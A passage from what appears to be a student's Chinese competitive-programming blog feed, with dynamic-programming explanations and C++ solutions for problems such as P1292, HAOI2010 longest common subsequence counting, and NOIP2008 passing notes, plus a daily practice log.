class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1292监狱"><a href="#P1292监狱" class="headerlink" title="P1292监狱"></a>P1292监狱</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<ul>
<li>小X的王国中有一个奇怪的监狱，这个监狱一共有P个牢房，这些牢房一字排开，第i个仅挨着第i+1个（最后一个除外），当然第i个也挨着第i-1个（第一个除外），现在牢房正好是满员的。</li>
<li>上级下发了一个释放名单，要求每天释放名单上的一个人。这可把看守们吓得不轻，因为看守们知道，现在牢房里的P个人，可以相互之间传话。第i个人可以把话传给第i+1个，当然也能传给第i-1个，并且犯人很乐意把消息传递下去。</li>
<li>如果某个人离开了，那么原来和这个人能说上话的人，都会很气愤，导致他们那天会一直大吼大叫，搞得看守很头疼。如果给这些要发火的人吃上肉，他们就会安静下来。为了河蟹社会，现在看守们想知道，如何安排释放的顺序，才能是的他们消耗的肉钱最少。</li>
</ul>
</blockquote>
<h2 id="输入：-2"><a href="#输入：-2" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<ol>
<li>第一行两个数P和Q，Q表示释放名单上的人数；<br></li>
<li>第二行Q个数，表示要释放哪些人。</li>
</ol>
</blockquote>
<h2 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>仅一行，表示最少要给多少人次送肉吃。</p>
</blockquote>
<h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><p>对于这道题我也是想了好久好久好久的说，首先我们可以这样来想，监狱里面一共有m个需要出来，每出来一个人，周围相连的人就需要喂肉肉，那么我们就可以这样进行计算，计算区间i到j的人离开之后需要喂肉肉的最小值。</p>
<p>我们来进行一个非常重要的预处理，这个预处理就是用来计算当一个人逃离出来监狱之后，其他的监友需要吃到的肉，也就是两个要出走的人之间的距离，我们建一个一维数组Get[i]最终这个数组表示的将是释放前i个人需要支付的肉肉之和，对于区间3,4用Get来计算出来第3个人插入的时候最小值，具体处理方法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">&#123;</span><br><span class="line">    Get[i]=a[i]-a[i<span class="number">-1</span>]<span class="number">-1</span>;</span><br><span class="line">    Get[i]+=Get[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">Get[m+<span class="number">1</span>]=n-a[m]+Get[m];</span><br></pre></td></tr></table></figure>
<p>这个处理出来之后，我们就可以轻易的知道第几个人插入的时候的值了，然后设置状态 <code>f[i][j]</code> 表示第i个人到j个人（不包括）插入需要的最小值，比如 <code>f[1][2]</code> 就表示1离开需要喂肉肉的最小值，这样在进行区间合并的时候，就可以这样：<code>f[1][4]=f[1][2]+f[3][4]+Get</code> ;</p>
<p>解释一下就是 <code>f[1][4]</code> 表示的是从1到3这三个人脱离之后的最小喂肉肉值，就是第1个人拖出来然后去喂肉肉的最小值加上第3个人拖出来然后去喂肉肉的最小值之后，还需要加上中间的那个人，也就是第三重循环枚举的第k个人，只有第k（3）个人最先拖出来砍掉，其他的第1个人和第3个人才能运用出来最优解，而Get的求法（第k个人出来需要给其他人喂肉肉的最小值）就是 <code>Get[4]-Get[1-1]+4-1-1</code> （ <code>Get[j]-Get[i-1]+j-i-1</code> ）；其中Get在处理的时候忽略掉了要出去的人（最优值），但是第k个人先出去的时候，其他要出去的人还没有出去，所以不能忽略，那么就需要加上去，也就是 <code>j-i-1=2</code> （两个人，第1个人和第3个人），那么状态转移方程就出来了：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[i][j]=min(f[i][j], f[i][k]+f[k+<span class="number">1</span>][j]+Get[j]-Get[i<span class="number">-1</span>]+j-i<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<p>这一类型的题目还是需要多想想，多练练，在动态规划中预处理非常重要，有些方程如果没有预处理就无法进行计算。好多明明想出来了状态转移方程了，但是由于无法计算出来状态转移方程中的具体值，那么最后导致不得不放弃最后的方程，陷入无解状态，所以说以后做题需要仔细想一想中间看似不能求解的值，最后能否可以通过预处理进行求出来，然后在状态转移方程中用出来。</p>
<h2 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,a[<span class="number">1001</span>],f[<span class="number">1001</span>][<span class="number">1001</span>];</span><br><span class="line"><span class="keyword">int</span> Get[<span class="number">1001</span>],now;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">10</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Get,<span class="number">0</span>,<span class="keyword">sizeof</span>(Get));</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    sort(a+<span class="number">1</span>,a+m+<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    f[m+<span class="number">1</span>][m+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        f[i][i]=<span class="number">0</span>;</span><br><span class="line">        Get[i]=a[i]-a[i<span class="number">-1</span>]<span class="number">-1</span>;</span><br><span class="line">        Get[i]+=Get[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    Get[m+<span class="number">1</span>]=n-a[m]+Get[m];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m+<span class="number">1</span>;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=m+<span class="number">1</span>;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=m+<span class="number">1</span>;j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=i;k&lt;j;k++)</span><br><span class="line">    f[i][j]=min(f[i][j], f[i][k]+f[k+<span class="number">1</span>][j]+Get[j]-Get[i<span class="number">-1</span>]+j-i<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[<span class="number">1</span>][m+<span class="number">1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Apr刷题柱</title>
    <url>/2017/05/19/b267f74be642/</url>
    <content><![CDATA[<h1 id="综述："><a href="#综述：" class="headerlink" title="综述："></a>综述：</h1><blockquote>
<p>完全是受到了尧神的启发，决定开一个刷题柱，记录下来每天刷的题，给自己增添一些动力QAQ，加油！</p>
</blockquote>
<h1 id="刷题榜："><a href="#刷题榜：" class="headerlink" title="刷题榜："></a>刷题榜：</h1><p>Apr/5    五道题：P1282，P1283，P1284，P1285，P1296；<br><br>Apr/6    五道题：P1286，P1287，P1290，P1291，P1292；<br><br>Apr/7    五道题：P1293，P1294，P1295，P1298，P1331；<br><br>Apr/8    四道题：P1507，P1326，P1327，P1309；<br><br>Apr/9    今天没有刷题  复习+总结；<br><br>Apr/10  一道题：P1328；<br><br>Apr/11  放假；<br><br>Apr/12  放假；<br><br>Apr/13  五道题：P1966，P1661，P1330，P1329，P1924；<br><br>Apr/14  五道题：P1907，P1935，P1662，P1660，P1093；<br><br>Apr/15  四道题：P1096，P1098，P1900，P1901；<br><br>Apr/16  去轻院ACM浪了一波QAQ ；<br><br>Apr/17  考前复习；<br><br>Apr/18  期中考试；<br><br>Apr/19  期中考试；<br><br>Apr/20  放假 两道题：P1315，P1236；<br><br>Apr/21  放假 总结<br><br>Apr/22  完成总结<br><br>Apr/23  HAOI（要滚回去学文化课了）<br><br>Apr/24  学了位运算<br><br>Apr/25  两道题：P1300，P1303；<br><br>Apr/26  一道题：P1302；<br><br>Apr/27  一道题：P1304；</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>刷题柱</tag>
      </tags>
  </entry>
  <entry>
    <title>多进程DP</title>
    <url>/2017/05/19/bfe5df585c86/</url>
    <content><![CDATA[<h1 id="直接题目"><a href="#直接题目" class="headerlink" title="直接题目"></a>直接题目</h1><h2 id="P1283-HAOI2010-最长公共子序列"><a href="#P1283-HAOI2010-最长公共子序列" class="headerlink" title="P1283 HAOI2010 最长公共子序列"></a>P1283 HAOI2010 最长公共子序列</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><blockquote>
<p>字符序列的子序列是指从给定字符序列中随意地（不一定连续）去掉若干个字符（可能一个也不去掉）后所形成的字符序列。令给定的字符序列X=“x0，x1，…，xm-1”，序列Y=“y0，y1，…，yk-1”是X的子序列，存在X的一个严格递增下标序列&lt;i0，i1，…，ik-1&gt;，使得对所有的j=0，1，…，k-1，有xij = yj。例如，X=“ABCBDAB”，Y=“BCDB”是X的一个子序列。 对给定的两个字符序列，求出他们最长的公共子序列。</p>
</blockquote>
<h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<p>两行序列，以”.”为结尾。</p>
</blockquote>
<h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><blockquote>
<p>两行，最长公共子序列的长度和最长公共子序列的数量；</p>
</blockquote>
<h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>这道题的第一问是比较好求的，只需要列出状态转移方程：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[i][j]=max(f[i][j],f[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ch1[i]==ch2[j])</span><br><span class="line">f[i][j]=max(f[i][j],f[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>但是关键在于第二问，第二问需要求出序列的数量，也就是所有的方案数，我们就可以建立一个数组  <code>g[i][j]</code> 表示在第一行字符i之前和第二行字符j之前，序列长度为 <code>f[i][j]</code> 的方案总数为 <code>g[i][j]</code> ，我们需要知道得出 <code>f[i][j]</code> 的方式。</p>
<p>当前如果 <code>ch[i]==ch[j]</code> 的时候，如果可以通过 <code>f[i-1][j]</code> （或者/和） <code>f[i][j-1]</code> 来原封不动的得到当前最优的 <code>f[i][j]</code> 那么 <code>g[i-1][j]</code> 和 <code>g[i][j-1]</code> 都能到达长度为 <code>f[i][j]</code> 的情况。并且因为 <code>ch[i]==ch[j]</code> 所以说通过 <code>f[i-1][j-1]+1</code> 得到的 <code>f[i][j]</code> 也一定是最优的。那么我么就可以列出这样的转移方程：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(ch1[i]==ch2[j])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> k1=<span class="number">0</span>,k2=<span class="number">0</span>,k3=<span class="number">0</span>;</span><br><span class="line"> 	f[i][j]=max(f[i][j],f[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(f[i][j]==f[i<span class="number">-1</span>][j]) k1=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(f[i][j]==f[i][j<span class="number">-1</span>]) k2=<span class="number">1</span>;</span><br><span class="line">	Get[i][j]=Get[i<span class="number">-1</span>][j<span class="number">-1</span>]+Get[i<span class="number">-1</span>][j]*k1+Get[i][j<span class="number">-1</span>]*k2;</span><br><span class="line">	Get[i][j]%=<span class="number">100000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么如果当前 <code>ch[i]!=ch[j]</code> 的时候呢我们需要判断 <code>f[i-1][j-1]</code> 是否等于f[i][j]，如果等于，就需要最后的 <code>g[i][j]</code> 中减去 <code>g[i-1][j]</code> 。因为一定有 <code>f[i-1][j]</code> 和 <code>f[i][j-1]</code> 更新了 <code>f[i][j]</code> ，并且 <code>f[i-1][j]</code> 和 <code>f[j][i-1]</code> 相等，这点可以根据 <code>f[i-1][j-1]==f[i][j]</code> 理解一下，所以说其实 <code>g[i][j]</code> 就是 <code>g[i-1][j-1]</code> 的值，但是我们<strong>加了两次</strong>，所以需要减掉。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> k1=<span class="number">0</span>,k2=<span class="number">0</span>,k3=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(f[i][j]==f[i<span class="number">-1</span>][j]) k1=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(f[i][j]==f[i][j<span class="number">-1</span>]) k2=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(f[i][j]==f[i<span class="number">-1</span>][j<span class="number">-1</span>]) k3=<span class="number">1</span>;</span><br><span class="line">	Get[i][j]=Get[i<span class="number">-1</span>][j]*k1+Get[i][j<span class="number">-1</span>]*k2-Get[i<span class="number">-1</span>][j<span class="number">-1</span>]*k3;</span><br><span class="line">	Get[i][j]%=<span class="number">100000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们就可以解决这道题了，其实关键就是<strong>状态转移方程</strong>，当前最优值得出来的一个过程不好想到。</p>
<h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> ch1[<span class="number">5100</span>],ch2[<span class="number">5100</span>];</span><br><span class="line"><span class="keyword">int</span> len1,len2;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">5100</span>][<span class="number">5100</span>];</span><br><span class="line"><span class="keyword">int</span> Get[<span class="number">5100</span>][<span class="number">5100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Get,<span class="number">0</span>,<span class="keyword">sizeof</span>(Get));</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;ch;</span><br><span class="line">    len1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ch!=<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ch1[++len1]=ch;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;ch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;ch;</span><br><span class="line">    len2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ch!=<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ch2[++len2]=ch;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;ch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=len2;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Get[<span class="number">0</span>][i]=<span class="number">1</span>;</span><br><span class="line">        Get[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len1;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=len2;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k1=<span class="number">0</span>,k2=<span class="number">0</span>,k3=<span class="number">0</span>;</span><br><span class="line">        f[i][j]=max(f[i<span class="number">-1</span>][j],f[i][j<span class="number">-1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(ch1[i]==ch2[j])</span><br><span class="line">        &#123;</span><br><span class="line">            f[i][j]=max(f[i][j],f[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(f[i][j]==f[i<span class="number">-1</span>][j]) k1=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(f[i][j]==f[i][j<span class="number">-1</span>]) k2=<span class="number">1</span>;</span><br><span class="line">            Get[i][j]=Get[i<span class="number">-1</span>][j<span class="number">-1</span>]+Get[i<span class="number">-1</span>][j]*k1+Get[i][j<span class="number">-1</span>]*k2;</span><br><span class="line">            Get[i][j]%=<span class="number">100000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(f[i][j]==f[i<span class="number">-1</span>][j]) k1=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(f[i][j]==f[i][j<span class="number">-1</span>]) k2=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(f[i][j]==f[i<span class="number">-1</span>][j<span class="number">-1</span>]) k3=<span class="number">1</span>;</span><br><span class="line">            Get[i][j]=Get[i<span class="number">-1</span>][j]*k1+Get[i][j<span class="number">-1</span>]*k2-Get[i<span class="number">-1</span>][j<span class="number">-1</span>]*k3;</span><br><span class="line">            Get[i][j]%=<span class="number">100000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[len1][len2]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;Get[len1][len2]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="P1284交错匹配"><a href="#P1284交错匹配" class="headerlink" title="P1284交错匹配"></a>P1284交错匹配</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><blockquote>
<p>有两行<strong>自然数</strong>，<code>UP[1..N]</code> ，<code>DOWN[1..M]</code> ，如果 <code>UP[I]=DOWN[J]=K</code> ，那么上行的第I个位置的数就可以跟下行的第J个位置的数连一条线，称为一条K匹配，但是同一个位置的数最多只能连一条线。另外，每个K匹配都必须且至多跟一个L匹配相交且 <code>K≠L</code> 。现在要求一个最大的匹配数。 例如：以下两行数的最大匹配数为8.</p>
</blockquote>
<p><img src="https://xorex.space/image/018.jpg"></p>
<h3 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<p>第一行有两个正整数N和M。第二行N个UP的自然数，第三行M个DOWN的自然数。其中0&lt;N、M&lt;=200，UP、DOWN的数都不超过32767。</p>
</blockquote>
<h3 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h3><blockquote>
<p>最大匹配数；</p>
</blockquote>
<h3 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h3><p>首先感谢cdc的解题思路。</p>
<p>这道题也是比较魔性的，首先我们拿到这题是不是满脸蒙蔽，所以说我们需要想一下这道题的思路，我们列出状态设置f[i][j]表示在第一层第i个数和第二层第j个数的时候，交错匹配的最大值。然后我们首先用一个二重循环来找出在i和j之前的最大值，并赋值给f[i][j]。</p>
<p>然后我们就可以再次进行一个二重循环，枚举i和j之前，如果枚举到一个p和q能够将i和q，j和p进行一个二维交叉，美滋滋也就是说，在p和q的基础上，我们又多了一个方案，于是愉快的列出状态转移方程：</p>
<p>这道题和前面的也是一样的，状态转移方程是比较难想出来的，所以说我们要想方设法在前面找出继承给下一个最优值的方法，有时候题目上有很多乱七八糟的限制的时候，不停地结合数据范围，进行增加维度，然后想办法在新增加的维度里面尝试的解决这些乱七八糟的问题就可以了，动态规划还是需要进行多多联系，然后仔细想想方法。</p>
<h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,a[<span class="number">201</span>],b[<span class="number">201</span>],f[<span class="number">201</span>][<span class="number">201</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;b[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=i;k++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> l=<span class="number">1</span>;l&lt;=j;l++)</span><br><span class="line">        f[i][j]=max(f[i][j],f[k][l]);</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=b[j])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=i;k++)</span><br><span class="line">            <span class="keyword">if</span>(a[k]==b[j])</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> l=<span class="number">1</span>;l&lt;=j;l++)</span><br><span class="line">            <span class="keyword">if</span>(a[i]==b[l])</span><br><span class="line">            f[i][j]=max(f[i][j],f[k<span class="number">-1</span>][l<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[n][m]*<span class="number">2</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="P1296-传纸条-NOIP2008-T3"><a href="#P1296-传纸条-NOIP2008-T3" class="headerlink" title="P1296 传纸条 (NOIP2008 T3)"></a>P1296 传纸条 (NOIP2008 T3)</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h3><blockquote>
<p>小渊♂和小轩♀是好朋友也是<strong>同班同学</strong>，他们在一起总有谈不完的话题。一次素质拓展活动中，班上同学安排做成一个m行n列的矩阵，而小渊和小轩被安排在矩阵对角线的两端，因此，他们就无法直接交谈了。幸运的是，他们可以通过传纸条来进行交流。纸条要经由许多同学传到对方手里，小渊坐在矩阵的左上角，坐标(1,1)，小轩坐在矩阵的右下角，坐标(m,n)。从小渊传到小轩的纸条只可以向下或者向右传递，从小轩传给小渊的纸条只可以向上或者向左传递。 在活动进行中，小渊希望给小轩传递一张纸条，同时希望小轩给他回复。班里每个同学都可以帮他们传递，但只会帮他们一次，也就是说如果此人在小渊递给小轩纸条的时候帮忙，那么在小轩递给小渊的时候就不会再帮忙。反之亦然。 还有一件事情需要注意，全班每个同学愿意帮忙的好感度有高有低（注意：小渊和小轩的好心程度没有定义，输入时用0表示），可以用一个0-100的自然数来表示，数越大表示越好心。小渊和小轩希望尽可能找好心程度高的同学来帮忙传纸条，即找到来回两条传递路径，使得这两条路径上同学的好心程度只和最大。现在，请你帮助小渊和小轩找到这样的两条路径。</p>
</blockquote>
<h3 id="输入：-2"><a href="#输入：-2" class="headerlink" title="输入："></a>输入：</h3><blockquote>
<p>输入第一行有2个用空格隔开的整数m和n，表示班里有m行n列（1&lt;=m,n&lt;=50）。<br>接下来的m行是一个m*n的矩阵，矩阵中第i行j列的整数表示坐在第i行j列的学生的好心程度。每行的n个整数之间用空格隔开。</p>
</blockquote>
<h3 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h3><blockquote>
<p>输出共一行，包含一个整数，表示来回两条路上参与传递纸条的学生的好心程度之和的最大值。</p>
</blockquote>
<h3 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h3><p>NOIP的T3在我的印象里都是看不懂，不会做的题，没想到放到动态规划里面竟然如此简单（相对于其他T3来说），不过也是需要思考很久的，这里的状态设置方面是可以很容易想出来的，难的地方是“不难得出的状态转移方程”。</p>
<p>然后我们就开始愉快的解题过程了，这里建立一个 <code>f[i][j][p][q]</code> 一共四个状态，来表示传过来的纸条和回复的纸条在i,j和p,q的位置的时候，他们路过的好感度之和的最大值。</p>
<p>另外一个小优化，q可以通过i，j和p求出来，因为当前两个纸条经过的人数时相同的，那么我们可以用i+j-p来求出来q，这样可以省下来一重循环，然后我们就通过列出到达i,j和p,q的四种方案，也就是通过左和上转移过来的状态*2。然后我们就选择最大的加上新走到的位置 <code>a[i][j]</code> 和 <code>a[p][q]</code> 的值（如果两个纸条的位置相同那么就需要加上一个就好）。</p>
<h3 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,f[<span class="number">51</span>][<span class="number">51</span>][<span class="number">51</span>][<span class="number">51</span>];</span><br><span class="line"><span class="keyword">int</span> First,Second,q,a[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">-1</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span 